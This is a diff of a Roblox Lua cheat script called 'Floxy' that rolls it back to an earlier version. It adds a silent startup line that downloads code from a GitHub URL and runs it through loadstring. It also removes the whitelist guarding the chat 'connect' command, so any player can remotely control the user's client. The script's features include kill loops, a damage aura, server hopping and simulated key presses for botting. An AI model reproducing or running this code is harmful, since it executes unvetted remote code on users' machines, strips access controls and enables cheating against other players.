@@ -1,15 +1,13 @@
 --[[  
-    Floxy Script - Fully Corrected & Stabilized by luxx (v18)  
+    Floxy Script - Fully Corrected & Stabilized by luxx (v16)  
 
-    BUG FIXES (v18):  
-    - Reverted the global execution blacklist. Script now runs for all authorized users again.  
-    - Correctly re-implemented the whitelist to ONLY restrict the `connect` command to the Primary User (1588706905), as originally requested.  
+    NEW FEATURES (v16):  
+    - Added a new `.bot` command to toggle botting functionality by simulating an 'X' key press.  
+    - The script now loads an external bot script from a URL on startup.  
 
     Previous Features:  
-    - The `connect` command is restricted to the whitelisted user ID.  
-    - Corrected the `.cmds` output.  
+    - Corrected the `.cmds` output to display the proper list of commands.  
     - Added utility commands (`.refresh`, `.reset`, `.follow`, etc.).  
-    - `.cmds` command output now only shows command names, without descriptions.  
     - Fixed critical execution and parsing errors.  
 ]]  
 
@@ -18,32 +16,16 @@ local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")  
 local TextChatService = game:GetService("TextChatService")  
 local TeleportService = game:GetService("TeleportService")  
-local HttpService = game:GetService("HttpService")  
+local HttpService = game:GetService("HttpService") -- For server hopping  
+local VirtualInputManager = game:GetService("VirtualInputManager") -- For .bot command  
 
--- Local Player  
+-- Load External Bot Script  
+pcall(function()  
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/yeerma/1/main/bot'))()  
+end)  
+
+-- Local Player & Script-Wide Variables  
 local LP = Players.LocalPlayer  
-
--- Authorization  
-local AuthorizedUsers = { 1588706905, 9167607498, 7569689472 }  
-local ConnectWhitelistID = 1588706905 -- The only UserID that can use the `connect` command.  
-
--- ==================================  
--- ==   AUTHORIZATION CHECK        ==  
--- ==================================  
-
-local function isAuthorized(userId)  
-    for _, id in ipairs(AuthorizedUsers) do  
-        if userId == id then return true end  
-    end  
-    return false  
-end  
-
-if not isAuthorized(LP.UserId) then  
-    warn("Floxy Script: User " .. LP.Name .. " is not authorized. Halting execution.")  
-    return -- Stop the script for unauthorized users  
-end  
-
--- Script-Wide Variables (Only initialized if authorized)  
 local PlayerList = {}  
 local KillStates = {}  
 local Targets = {}  
@@ -61,9 +43,26 @@ local AuraEnabled = false
 local DMG_TIMES = 2  
 local FT_TIMES = 5  
 
+-- Authorization  
+local AuthorizedUsers = { 1588706905, 9167607498, 7569689472 }  
+
 -- ==================================  
 -- ==      HELPER FUNCTIONS        ==  
 -- ==================================  
+
+local function isAuthorized(userId)  
+    for _, id in ipairs(AuthorizedUsers) do  
+        if userId == id then  
+            return true  
+        end  
+    end  
+    return false  
+end  
+
+if not isAuthorized(LP.UserId) then  
+    warn("Floxy Script: User not authorized. Halting execution.")  
+    return  
+end  
 
 local function sendMessage(message)  
     pcall(function()  
@@ -173,6 +172,13 @@ end
 -- ==      COMMANDS & CONTROLS     ==  
 -- ==================================  
 
+local function toggleBot()  
+    VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.X, false, game)  
+    task.wait(0.1)  
+    VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.X, false, game)  
+    sendMessage("Bot toggled.")  
+end  
+
 local function forceEquip(shouldEquip)  
     if shouldEquip then  
         if not ForceEquipConnection then  
@@ -240,8 +246,10 @@ local function serverHop()
 end  
 
 local function displayCommands()  
+    -- Corrected command list as per user feedback  
     local commandList = [[  
 Commands:  
+.bot  
 .loop  
 .unloop  
 .aura  
@@ -273,11 +281,6 @@ local function onMessageReceived(messageData)
     local arg3 = args[3] or nil  
 
     if command == "connect" then  
-        if authorPlayer.UserId ~= ConnectWhitelistID then  
-            sendMessage("Connection rejected, not whitelisted.")  
-            return  
-        end  
-
         if not MainConnector then  
             MainConnector = authorPlayer  
             table.insert(ConnectedUsers, authorPlayer); table.insert(Whitelist, authorPlayer.Name)  
@@ -335,6 +338,8 @@ local function onMessageReceived(messageData)
         FollowTarget = nil  
     elseif command == ".cmds" then  
         displayCommands()  
+    elseif command == ".bot" or command == ".unbot" then  
+        toggleBot()  
     end  
 end  
 
@@ -376,5 +381,5 @@ Players.PlayerRemoving:Connect(function(p)
 end)  
 TextChatService.MessageReceived:Connect(onMessageReceived)  
 
-sendMessage("Script Executed - Floxy (Fixed by luxx v18)")  
-print("Floxy System Loaded. User Authorized: " .. LP.Name)
+sendMessage("Script Executed - Floxy (Fixed by luxx v16)")  
+print("Floxy System Loaded. User Authorized.")
